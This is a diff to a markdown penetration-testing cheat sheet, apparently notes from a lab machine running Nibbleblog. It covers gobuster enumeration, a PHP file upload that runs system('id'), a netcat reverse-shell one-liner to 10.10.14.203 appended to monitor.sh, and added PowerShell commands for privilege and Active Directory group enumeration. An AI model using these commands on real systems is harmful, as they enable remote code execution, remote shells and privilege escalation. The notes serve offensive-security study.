@@ -31,6 +31,7 @@ Enumerate crawl Gobuster:
 gobuster dir -u 10.129.200.170/nibbleblog -w /usr/share/dirb/wordlists/common.txt
 ```
 
+## PHP Injection
 To check if there's php injection available. Upload a php file with this content:
 ```php
 <?php system('id'); ?>
@@ -62,3 +63,19 @@ To add a line at the end of a file:
 echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.203 8443 >/tmp/f' | tee -a monitor.sh
 ```
 
+## PowerShell useful commands
+
+Check user rights and of a user on an endpoint:
+```powershell
+whoami /priv
+```
+
+Get group details:
+```powershell
+Get-ADGroup -Identity "Server Operators" -Properties *
+```
+
+Domain admins group membership:
+```powershell
+Get-ADGroup -Identity "Domain Admins" -Properties * | select DistinguishedName,GroupCategory,GroupScope,Name,Members
+```
